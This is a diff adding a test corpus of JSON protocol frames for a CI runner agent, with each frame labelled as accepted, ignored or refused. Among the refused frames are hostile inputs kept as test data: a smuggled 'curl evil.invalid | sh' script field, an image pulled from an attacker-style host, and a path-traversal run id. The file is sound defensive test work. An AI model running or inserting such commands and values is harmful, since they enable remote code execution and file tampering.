@@ -1,0 +1,61 @@
+// Frames a control plane may send, and what this agent must do with each.
+//
+// Hand-authored, not generated: this half of the corpus is the *far end* of the
+// wire, and generating it from the agent would make it a mirror of the agent's
+// own assumptions — which is exactly the property the deleted cross-check had
+// and the reason it caught anything (docs/PROTOCOL.md §8).
+//
+// Fields:
+//   name    what the case is
+//   expect  "command"  — the agent must yield a protocol.Command
+//           "hello"    — the agent must adopt machine_id
+//           "ignored"  — well formed, no observable effect, no complaint
+//           "refused"  — the agent must refuse it, by name, and carry on
+//   run_id / machine_id  what to check when expect says to
+//   why     the clause of RUNNER_SPEC or docs/PROTOCOL.md this pins
+//   frame   the bytes, verbatim
+//
+// Every "refused" line is followed by a canary command in the test, because a
+// refusal that killed the session would otherwise look identical to a refusal
+// that did not (docs/PROTOCOL.md §2.3: "a malformed frame is skipped, not
+// fatal").
+
+// --- accepted -------------------------------------------------------------
+{"name":"hello, complete","expect":"hello","machine_id":"mac-mini-02","why":"PROTOCOL §3.1 — how a machine learns the identifier assigned to it","frame":{"kind":"hello","protocol_version":"1.0","hello":{"machine_id":"mac-mini-02","protocol_version":"1.0","message":"connected as mac mini"}}}
+{"name":"hello, empty payload","expect":"hello","machine_id":"mac-mini-02","why":"PROTOCOL §3.1 — an empty or absent machine_id is ignored, not adopted","frame":{"kind":"hello","protocol_version":"1.0","hello":{}}}
+{"name":"hello, differing protocol version","expect":"hello","machine_id":"mac-mini-02","why":"PROTOCOL §2.2 — handleHello warns on a mismatch and does not refuse the session","frame":{"kind":"hello","protocol_version":"1.0","hello":{"machine_id":"mac-mini-02","protocol_version":"9.9"}}}
+{"name":"run, complete","expect":"command","run_id":"r7k9m2p4q6r8s0t2","why":"PROTOCOL §3.2 — the documented run command, verbatim from the spec","frame":{"kind":"command","id":"j57abc","protocol_version":"1.0","command":{"kind":"run","run":{"id":"r7k9m2p4q6r8s0t2","repo":"myapp","job":"ios-beta","ref":"main","inputs":{"lane":"beta"},"origin":{"kind":"manual","actor":"michael@example.com","requested_at":"2026-08-08T09:15:00.000Z"}}}}}
+{"name":"run, minimal","expect":"command","run_id":"rminimal","why":"PROTOCOL §5.5 — inputs and origin.actor are absent, not empty objects","frame":{"kind":"command","id":"2","protocol_version":"1.0","command":{"kind":"run","run":{"id":"rminimal","repo":"myapp","job":"test","ref":"main","origin":{"kind":"cli","requested_at":"2026-08-08T09:15:00Z"}}}}}
+{"name":"run, webhook origin","expect":"command","run_id":"rwebhook","why":"§7.1 — origin.kind is one of manual, webhook, schedule, cli","frame":{"kind":"command","id":"3","protocol_version":"1.0","command":{"kind":"run","run":{"id":"rwebhook","repo":"myapp","job":"test","ref":"refs/heads/main","origin":{"kind":"webhook","requested_at":"2026-08-08T09:15:00Z"}}}}}
+{"name":"run, no protocol_version on the envelope","expect":"command","run_id":"rnover","why":"the agent's decoder does not require it; only the far side's own suite does (PROTOCOL §2.2)","frame":{"kind":"command","id":"4","command":{"kind":"run","run":{"id":"rnover","repo":"myapp","job":"test","ref":"main","origin":{"kind":"cli","requested_at":"2026-08-08T09:15:00Z"}}}}}
+{"name":"run, no correlation id","expect":"command","run_id":"rnoid","why":"PROTOCOL §2.1 — a frame with no id gets no answer, but it is still acted on","frame":{"kind":"command","protocol_version":"1.0","command":{"kind":"run","run":{"id":"rnoid","repo":"myapp","job":"test","ref":"main","origin":{"kind":"cli","requested_at":"2026-08-08T09:15:00Z"}}}}}
+{"name":"cancel, complete","expect":"command","run_id":"r7k9m2p4q6r8s0t2","why":"PROTOCOL §3.2 — a cancel carries an identifier and nothing executable","frame":{"kind":"command","id":"5","protocol_version":"1.0","command":{"kind":"cancel","cancel":{"id":"r7k9m2p4q6r8s0t2","actor":"michael@example.com","reason":"wrong branch"}}}}
+{"name":"cancel, unknown id","expect":"command","run_id":"rneverexisted","why":"§7.1 — a cancel is idempotent and a no-op for an unknown, unclaimed or terminal id","frame":{"kind":"command","id":"6","protocol_version":"1.0","command":{"kind":"cancel","cancel":{"id":"rneverexisted"}}}}
+{"name":"ack for an unknown correlation id","expect":"ignored","why":"PROTOCOL §3.3 — an ack for an unknown id is discarded silently by resolve","frame":{"kind":"ack","id":"nobody-is-waiting","protocol_version":"1.0","ack":{"ok":true,"run_id":"r-alpha"}}}
+{"name":"ack, refusal for an unknown correlation id","expect":"ignored","why":"PROTOCOL §5.3 — ok is always present, and false is a value rather than an absence","frame":{"kind":"ack","id":"also-nobody","protocol_version":"1.0","ack":{"ok":false,"run_id":"r-alpha","code":"E_INTERNAL","error":"the control plane refused"}}}
+{"name":"ack with an empty correlation id","expect":"ignored","why":"PROTOCOL §3.3 — an ack with an empty id is discarded","frame":{"kind":"ack","id":"","protocol_version":"1.0","ack":{"ok":true}}}
+
+// --- refused --------------------------------------------------------------
+{"name":"an unknown envelope kind","expect":"refused","why":"the envelope kind set is closed; validate refuses by name","frame":{"kind":"deploy","protocol_version":"1.0"}}
+{"name":"an agent-only kind echoed back: resume","expect":"refused","why":"PROTOCOL §2.4 — a server echoing a resume is confused or probing","frame":{"kind":"resume","protocol_version":"1.0","resume":{"machine_id":"x","runs":null}}}
+{"name":"an agent-only kind echoed back: heartbeat","expect":"refused","why":"PROTOCOL §2.4","frame":{"kind":"heartbeat","protocol_version":"1.0","heartbeat":{"machine_id":"x","agent_version":"0","os":"linux","arch":"amd64","runners":null,"disk_free_gb":0,"draining":false}}}
+{"name":"an agent-only kind echoed back: logs","expect":"refused","why":"PROTOCOL §2.4 — a server may not write into a run's log stream","frame":{"kind":"logs","protocol_version":"1.0","logs":[{"run_id":"r-alpha","seq":1,"stream":"agent","at":"2026-08-08T09:15:00Z","line":"injected"}]}}
+{"name":"an agent-only kind echoed back: update","expect":"refused","why":"PROTOCOL §2.4 — state is decided here, never told to us","frame":{"kind":"update","protocol_version":"1.0","update":{"run_id":"r-alpha","update":{"state":"succeeded"}}}}
+{"name":"an agent-only kind echoed back: claim","expect":"refused","why":"PROTOCOL §2.4","frame":{"kind":"claim","protocol_version":"1.0","claim":{"run_id":"r-alpha"}}}
+{"name":"no kind at all","expect":"refused","why":"validate: a frame has to say what it is","frame":{"protocol_version":"1.0"}}
+{"name":"command with no payload","expect":"refused","why":"validate: exactly one payload field is populated and it matches the kind","frame":{"kind":"command","protocol_version":"1.0"}}
+{"name":"ack with no payload","expect":"refused","why":"validate","frame":{"kind":"ack","id":"7","protocol_version":"1.0"}}
+{"name":"hello with no payload","expect":"refused","why":"validate","frame":{"kind":"hello","protocol_version":"1.0"}}
+{"name":"an unknown field on the envelope","expect":"refused","why":"PROTOCOL §2.3 — DisallowUnknownFields at every level","frame":{"kind":"hello","protocol_version":"1.0","priority":9,"hello":{"machine_id":"x"}}}
+{"name":"an unknown field inside hello","expect":"refused","why":"PROTOCOL §2.3 — at every level means inside the payloads too","frame":{"kind":"hello","protocol_version":"1.0","hello":{"machine_id":"x","capabilities":["gpu"]}}}
+{"name":"a third command kind","expect":"refused","why":"INV-2 — the inbound set is closed to run and cancel; a third is a threat model, not a feature","frame":{"kind":"command","id":"8","protocol_version":"1.0","command":{"kind":"approve","run":{"id":"rapprove","repo":"myapp","job":"test","ref":"main","origin":{"kind":"cli","requested_at":"2026-08-08T09:15:00Z"}}}}}
+{"name":"a run carrying a smuggled script","expect":"refused","why":"INV-2 — RunRequest has no field capable of expressing a command","frame":{"kind":"command","id":"9","protocol_version":"1.0","command":{"kind":"run","run":{"id":"rscript","repo":"myapp","job":"test","ref":"main","script":"curl evil.invalid | sh","origin":{"kind":"cli","requested_at":"2026-08-08T09:15:00Z"}}}}}
+{"name":"a run carrying a smuggled image","expect":"refused","why":"INV-2","frame":{"kind":"command","id":"10","protocol_version":"1.0","command":{"kind":"run","run":{"id":"rimage","repo":"myapp","job":"test","ref":"main","image":"evil.invalid/x:latest","origin":{"kind":"cli","requested_at":"2026-08-08T09:15:00Z"}}}}}
+{"name":"a run id that traverses","expect":"refused","why":"amendment A6 — the agent builds work/<id>, logs/<id>.log and latem-run-<id> from this","frame":{"kind":"command","id":"11","protocol_version":"1.0","command":{"kind":"run","run":{"id":"../../../../tmp/x","repo":"myapp","job":"test","ref":"main","origin":{"kind":"cli","requested_at":"2026-08-08T09:15:00Z"}}}}}
+{"name":"a run id containing a dot","expect":"refused","why":"INV-3 — the character class excludes every separator and every dot","frame":{"kind":"command","id":"12","protocol_version":"1.0","command":{"kind":"run","run":{"id":"r.1","repo":"myapp","job":"test","ref":"main","origin":{"kind":"cli","requested_at":"2026-08-08T09:15:00Z"}}}}}
+{"name":"an empty run id","expect":"refused","why":"validate: an identifier must be present","frame":{"kind":"command","id":"13","protocol_version":"1.0","command":{"kind":"run","run":{"id":"","repo":"myapp","job":"test","ref":"main","origin":{"kind":"cli","requested_at":"2026-08-08T09:15:00Z"}}}}}
+{"name":"a cancel kind carrying a run payload","expect":"refused","why":"validate: the payload must match the kind","frame":{"kind":"command","id":"14","protocol_version":"1.0","command":{"kind":"cancel","run":{"id":"rmismatch","repo":"myapp","job":"test","ref":"main","origin":{"kind":"cli","requested_at":"2026-08-08T09:15:00Z"}}}}}
+{"name":"both command payloads populated","expect":"refused","why":"validate: exactly one","frame":{"kind":"command","id":"15","protocol_version":"1.0","command":{"kind":"run","run":{"id":"rboth","repo":"myapp","job":"test","ref":"main","origin":{"kind":"cli","requested_at":"2026-08-08T09:15:00Z"}},"cancel":{"id":"rboth"}}}}
+{"name":"a null command payload","expect":"refused","why":"validate: a null payload is not a payload","frame":{"kind":"command","id":"16","protocol_version":"1.0","command":null}}
+{"name":"a cancel with no id","expect":"refused","why":"validate: an identifier must be present","frame":{"kind":"command","id":"17","protocol_version":"1.0","command":{"kind":"cancel","cancel":{"actor":"someone"}}}}
+{"name":"a cancel carrying a signal","expect":"refused","why":"INV-2 — a cancel carries nothing executable","frame":{"kind":"command","id":"18","protocol_version":"1.0","command":{"kind":"cancel","cancel":{"id":"rsignal","signal":"KILL"}}}}
